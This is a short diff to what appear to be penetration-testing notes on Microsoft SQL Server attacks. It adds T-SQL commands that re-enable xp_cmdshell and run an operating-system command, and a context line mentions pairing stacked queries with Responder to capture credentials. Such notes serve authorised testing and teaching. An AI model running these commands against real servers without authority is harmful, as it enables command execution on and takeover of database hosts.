@@ -17,6 +17,13 @@ select * from <db-name>.dbo.<table-name>;
 
 # Command Injection
 ## `xp_cmdshell`
+If it is disabled: https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet
+```
+EXEC sp_configure 'show advanced options', 1;
+RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell', 1;
+EXEC xp_cmdshell 'whoami';
+```
 
 ## Stacked Queries
 Use it with responder. If it is system account you f*cked up! :D
